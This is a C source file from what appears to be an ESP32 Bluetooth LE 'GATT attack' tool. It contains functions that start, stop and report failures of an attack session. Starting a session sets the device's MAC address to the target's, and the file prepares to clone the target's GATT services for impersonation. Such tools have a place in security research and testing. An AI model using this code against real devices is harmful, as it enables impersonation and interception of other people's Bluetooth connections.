#include "gatt_internal.h"

void connection_failed(const char *operation) {
  connecting = false;
  connected = false;
  gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECT_FAIL;
  ESP_LOGW(TAG, "Target connection failed: %s", operation);
  gatt_send_state(gattAttackState);
}

void stop_gatt_attack() {
  shutdown_gatt_attack = true;
  esp_ble_gap_stop_advertising();
  esp_ble_gap_stop_scanning();
  if (connected) esp_ble_gattc_close(clone.gattc_if, clone.target_client_conn_id);
  // Disabling/deinitializing the stack cancels pending opens and removes services.
  // Do not traverse/free the clone while discovery callbacks can still mutate it.
  ble_stack_deinit(false);
  write_queue_reset();
  free_clone();
  clone = (clone_t){0};
  clone.transactions.central_mtu = 23;
  pending_write = (pending_write_t){0};
  connected = connecting = clone_init = false;
  retries = service_num = cloned_service_num = last_end_handle = 0;
  ESP_LOGI(TAG, "Session stopped");
}

void start_gatt_attack(uint8_t *target) {
  shutdown_gatt_attack = false;
  clone = (clone_t){0};
  clone.transactions.central_mtu = 23;
  clone.gattc_if = clone.gatts_if = ESP_GATT_IF_NONE;
  memcpy(clone.target, target, sizeof(esp_bd_addr_t));
  if (esp_iface_mac_addr_set(target, ESP_MAC_BT) != ESP_OK || !ble_stack_init()) {
    connection_failed("Bluetooth initialization");
    return;
  }
  if (esp_ble_gap_register_callback(esp_gap_cb) != ESP_OK ||
      esp_ble_gattc_register_callback(client_event) != ESP_OK ||
      esp_ble_gattc_app_register(0) != ESP_OK) {
    connection_failed("callback registration");
    return;
  }
  esp_err_t result = esp_ble_gatt_set_local_mtu(500);
  if (result != ESP_OK) ESP_LOGW(TAG, "Local MTU setup failed: %s", esp_err_to_name(result));
}
